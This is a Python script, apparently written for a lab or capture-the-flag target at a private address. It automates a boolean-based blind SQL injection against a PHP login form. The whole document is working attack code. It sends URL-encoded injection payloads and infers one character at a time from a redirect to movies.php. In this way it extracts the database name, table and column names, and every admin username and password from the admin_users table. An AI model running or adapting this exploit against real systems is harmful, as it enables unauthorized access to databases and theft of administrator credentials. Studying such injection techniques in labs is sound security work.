from urllib.parse import quote, urlencode
import requests

def encode_url(s:str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%'+hex(e).replace('0x','').zfill(2))
    return ''.join(uri)

base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://10.0.2.14/logincheck.php'


#find database name length
for l in range(1, 20):
    payload = "1' or length(database())={}#".format(l)
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if 'movies.php' in res.url:
        database_len = l
        print('database length: ', l)
        break

#get database name
database_name = ''
for i in range(0, database_len+1):
    for c in base:
        payload = "1' or ascii(substr(database(),{},{}))={}#".format(i, i,ord(c))
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if 'movies.php' in res.url:
            database_name += c
            print(database_name)
            break
print('database name: ', database_name)

#get table number
for l in range(1, 20):
    payload = "1' or (select count(table_name) from information_schema.tables where table_schema = database())={}#".format(l)
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if 'movies.php' in res.url:
        table_numbers = l
        print('table numbers: ', l)
        break

#get table length
table_len = []
for i in range(0, table_numbers):
    for l in range(1, 20):
        payload = "1' or length((select table_name from information_schema.tables where table_schema = database() limit {},1))={}#".format(i,l)
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if 'movies.php' in res.url:
            table_len.append(l)
            print('table length: ', l)
            break


#get table name
table_name = []
for i in range(0, table_numbers):
    t_name = ''
    for l in range(0,table_len[i]+1):
        for c in base:
            payload = "1' or ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {},1),{},{}))={}#".format(i,l,l,ord(c))
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if 'movies.php' in res.url:
                t_name += c
                break
    table_name.append(t_name)
    print(t_name)

#get column numbers
for l in range(1, 20):
    payload = "1' or (select count(column_name) from information_schema.columns where table_name='admin_users')={}#".format(l)
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if 'movies.php' in res.url:
        column_numbers = l
        print('column numbers: ', l)
        break

# get column length
column_len = []
for i in range(0, column_numbers):
    for l in range(1, 20):
        payload = "1' or length((select column_name from information_schema.columns where table_name = 'admin_users' limit {},1))={}#".format(i,l)
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if 'movies.php' in res.url:
            column_len.append(l)
            print('column length: ', l)
            break

#get column name
column_name = []
for i in range(0, column_numbers):
    c_name = ''
    for l in range(0,column_len[i]+1):
        for c in base:
            payload = "1' or ascii(substr((select column_name from information_schema.columns where table_name = 'admin_users' limit {},1),{},{}))={}#".format(i,l,l,ord(c))
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if 'movies.php' in res.url:
                c_name += c
                break
    column_name.append(c_name)
    print(c_name)

#get admin_name numbers
for l in range(1, 20):
    payload = "1' or (select count(admin_name) from admin_users)={}#".format(l)
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# # get admin_name length
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or length((select admin_name from admin_users limit {},1))={}#".format(i,l)
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#get admin_user name
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(0,len[i]+1):
        for c in base:
            payload = "1' or ascii(substr((select admin_name from admin_users limit {},1),{},{}))={}#".format(i,l,l,ord(c))
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if 'movies.php' in res.url:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#get admin_password numbers
for l in range(1, 20):
    payload = "1' or (select count(admin_password) from admin_users)={}#".format(l)
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# # get admin_password length
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or length((select admin_password from admin_users limit {},1))={}#".format(i,l)
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#get admin_password name
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(0,len[i]+1):
        for c in base:
            payload = "1' or ascii(substr((select admin_password from admin_users limit {},1),{},{}))={}#".format(i,l,l,ord(c))
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if 'movies.php' in res.url:
                name += c
                break
    user_name.append(name)
    print('admin_password: ',name)